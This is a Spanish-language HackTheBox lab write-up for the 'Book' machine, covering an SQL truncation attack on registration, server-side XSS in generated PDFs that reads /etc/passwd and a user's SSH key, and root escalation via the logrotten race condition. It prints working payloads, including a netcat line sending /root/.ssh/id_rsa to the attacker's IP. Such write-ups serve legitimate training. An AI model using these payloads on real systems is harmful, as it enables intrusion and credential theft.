---
title: HTB Book Write-up (Español)
tags: [HackTheBox, SQL Truncation, Server Side XSS]
image: /assets/images/Book/1__gO7gprHuw3HwbrlPoj3zCQ.png
published: true
banner: true
---

I cloned my writeup that was originally posted on [medium](https://medium.com/@5ubterranean/htb-book-write-up-espa%C3%B1ol-534fb850f19)

Book es una máquina basada en Linux que estuvo activa desde el 22 de Febrero del 2020 hasta el 11 de Julio, desde mi punto de vista fue una máquina bastante complicada, ya que nunca antes me había encontrado con ninguna de las vulnerabilidades que esta máquina tenía, empezamos revisando la página web donde tenemos que crearnos una cuenta para acceder, también encontramos que el login de administrador usa una página aparte, una cosa que notamos al momento de registrarnos es que el servidor limita la logitud del nombre de usuario (y también del correo), tras investigar un poco encontraremos que podemos usar un sql truncation attack para crear un cuanta de administrador y así acceder a su panel, en dicho panel no encontraremos algo realmente interesante, solo unos reportes de la página en formato PDF, una vez más tenemos que investigar qué podemos hacer con esto, nos encontramos con un blog donde describe cómo podemos leer archivos del servidor a través de un PDF generado dinámicamente, usando esta vulnerabilidad exploramos el servidor y conseguimos las llave SSH del usuario “reader”, la escalación de privilegios se conseguirá por una vulnerabilidad de race condition en logrotate, la cual usaremos para conseguir la llave SSH del usuario root.

# Enumeración

Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.

```bash
masscan -e tun0 --rate=500 -p 0–65535 10.10.10.176  
nmap -sC -sV -p 80,22, -Pn -o scan.txt 10.10.10.176

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)  
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)  
|\_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
| http-cookie-flags:   
|   /:   
|     PHPSESSID:   
|\_      httponly flag not set  
|\_http-server-header: Apache/2.4.29 (Ubuntu)  
|\_http-title: LIBRARY - Read | Learn | Have Fun  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
```

Solo tenemos SSH y HTTP, por lo que empezamos por la página web, lanzamos gobuster para ver qué encontramos: `gobuster dir -u [http://10.10.10.176/](http://10.10.10.176/) -w /usr/share/wordlists/dirb/common.txt -t 30 -x txt,php,html`.

![](/assets/images/Book/1__v__kqS2ru__62Op8ptlZSvGw.png)


Esto nos revela que existe un directorio de “admin”, este será útil luego, primero entramos a su página como tal y vemos un login.

![](/assets/images/Book/1__rDu7A1b9U__sdVkAjkaeZUQ.png)


No tenemos ninguna información para poner aquí, pero vemos que nos ofrece una opción para crearnos una cuenta así que la probamos.

![](/assets/images/Book/1__etSXXqXnLgAeCTSleb42mA.png)


Esta funciona y podemos logearnos, parece una especie de página dedicada a los libros.

![](/assets/images/Book/1__Ny2cShJv__l__6UVogapMkag.png)


# Ganando acceso

Lo más interesante lo encontramos en [http://10.10.10.176/profile.php](http://10.10.10.176/profile.php).

![](/assets/images/Book/1__qr0c0__i4Qjf4oI451sWTVQ.png)


Como se ve el nombre no es exactamente el mismo que introducimos, sino que fue recortado, esta es la pista para encontrar la vulnerabilidad, aunque necesitamos saber cuál en el correo del administrador, entramos a “contact us” y lo encontramos ahí.

![](/assets/images/Book/1__h4W3m__eyPhaZjUANDjiLtw.png)


Ahora lo que tenemos que hacer es un [sql truncation attack](https://resources.infosecinstitute.com/sql-truncation-attack/), lo que ocurre aquí es que si bien el servidor recorta la información que ingresemos a 10 caracteres, toda la cadena que pongamos es verificada antes de hacer este recorte, por ejemplo si quisiéramos crear una cuenta con el nombre “5ubterrane” no podríamos ya que este ya está en uso, pero si en su lugar registramos “5ubterrane ” (Noten el espacio), esta sí sería aceptada, y luego al hacerse el recorte obtendríamos en mismo nombre, podemos usar cualquier otro caracter en lugar del espacio, pero esto es importante si queremos crear un cuenta con un nombre menor al límite (por ejemplo “admin”), ya que una vez ejecutado el recorte los espacios serán ignorados, los mismo pasa con el campo del e-mail, aunque en este caso tenemos un control en el fronted, por lo que ejecutaremos la petición con burp para pasarlo.

![](/assets/images/Book/1__QrbM__kyxJYKHUawJMsNQVw.png)


Una vez creamos la cuenta con una cualquier contraseña podemos acceder a esta, el servidor elimina las cuentas duplicadas cada corto tiempo, por lo que tenemos que acceder rápido, por suerte ya que la cookie es un PHPSESSID podemos logearnos con burp, y al recargar nuestro navegador este también ya estará logeado.

![](/assets/images/Book/1__NXesghrIDD5je9Wmk72wKA.png)


En el panel de administrador no parece haber funciones muy interesantes.

![](/assets/images/Book/1____65bwE2NsPr9BqcxXWfoYA.png)


Si descargamos el PDF de collections vemos la siguiente información en el archivo descargado.

![](/assets/images/Book/1__oXfmRtYpWQ6FSMP__4VJeOQ.png)


Este contiene el título del libro, el autor y un link de descarga, una opción que teníamos como un usuario normal era la de subir un libro, cuando hacemos eso la información que pongamos aparecerá aquí, por lo que luego de investigar un rato encontramos el siguiente [enlace](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html), ahí vemos cómo es posible ejecutar XSS en un archivo PDF generado dinámicamente, justo lo que tenemos, entonces insertamos el siguiente payload en los campos al momento de subir un libro para conseguir el archivo “passwd”: `<script>x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(“GET”,”file:///etc/passwd”); x.send();</script>`.

![](/assets/images/Book/1__qpXQlLkXpUqaU4p9hc1Wzw.png)


Y al descargar el archivo lo conseguimos.

![](/assets/images/Book/1__nVgduP4RBRlpnzCxG__jU__g.png)


Vemos que existe un usuario “reader”, ya que el servicio SSH está activo tratamos de conseguir su llave SSH (si es que la tiene), para eso cambiamos nuestro payload por: `<script>x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(“GET”,”file:///home/reader/.ssh/id_rsa”); x.send();</script>`, al descargar el archivo vemos que lo conseguimos.

![](/assets/images/Book/1__308cMwk73Yb1KRFjipfXxw.png)


Bien, conseguimos la llave, pero todo el texto no entra en el lector de PDF, para poder copiarla correctamente la mejor opción es abrir el PDF con un navegador y copiarla desde ahí, pero tenemos la llave desordenada.

![](/assets/images/Book/1__ehOrI7hfLKYsHZyg__hP__RQ.png)


Para arreglarla basta con escribir un programa en python que imprima 64 caracteres por línea:

a=<llave SSH>  
q = 0  
while q < len(a):  
    print a\[q:q+64\]  
    q += 64  
print a\[q:\]

Nos conectamos usando SSH: `ssh -i id_rsa reader@10.10.10.176`. Y por fin conseguimos acceso a la máquina y el archivo user.txt.

![](/assets/images/Book/1__3F9bZQ7lZW9SVkFoNaPwpQ.png)


# Escalación de privilegios

Subimos [pspy](https://github.com/DominicBreuker/pspy) a la máquina y vemos que pasa en ella por un rato, vemos que logrotate se ejecuta como root.

![](/assets/images/Book/1__8VriVzdujtOBFrbvzTcqiw.png)


Si buscamos vulnerabilidades al respecto nos encontramos con [logrotten](https://github.com/whotwagner/logrotten/blob/master/logrotten.c), el cual es un race condition, ya que la máquina tiene instalado gcc podemos compilarlo ahí mismo, si intentamos ejecutar una reverse shell con este exploit esta durará muy poco, por lo que al igual que hicimos con el usuario extraeremos la llave SSH, pero ahora del usuario root, para eso crearemos un archivo con el siguiente contenido: ``if [ `id -u` -eq 0 ]; then (nc 10.10.15.8 54321 < /root/.ssh/id_rsa); fi``, eso mandará la llave hacia nuestro máquina donde tendremos `nc` escuchando en el puerto “54321".

![](/assets/images/Book/1__9zn__eC__ceZn__TYZff56YQA.png)


Ejecutamos el exploit con el siguiente comando: `nice -n 20 ./.logrotten -p .payload /home/reader/backups/access.log`. Vemos que aunque esperemos no pasa nada, ya que de hecho tenemos que provocar que logrotate se ejecute, para esto vamos a “/home/reader/backup”, y vemos que ahí hay un archivo llamado access.log, si escribimos algo en ese archivo logrotate será ejecutado.

![](/assets/images/Book/1__MkFZAeVWmbLVND0irdz2sw.png)
![](/assets/images/Book/1__AWk7aF4H2ZvKlsSetWiSRg.png)


Aunque hayamos obtenido el mensaje “Done!” del exploit esto no significa que este se haya ejecutado correctamente, para verificarlo tenemos que ver el contenido de nuestra payload reflejado en “/etc/bash\_completion.d/access.log”.

![](/assets/images/Book/1__KbNj8GJXyoN__QsN42lfXGQ.png)


El contenido esto ahí, ahora solo nos tenemos que volver a conectar por SSH para que se ejecute el payload y conseguir la llave SSH.

![](/assets/images/Book/1__rUxi0oOuLLCdtUmvRYfQvQ.png)


Y con eso podemos acceder con root y terminamos con la máquina.

![](/assets/images/Book/1__ofP__38biDe4xb4Ok__f2p7w.png)


# Descargo de responsabilidad

Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.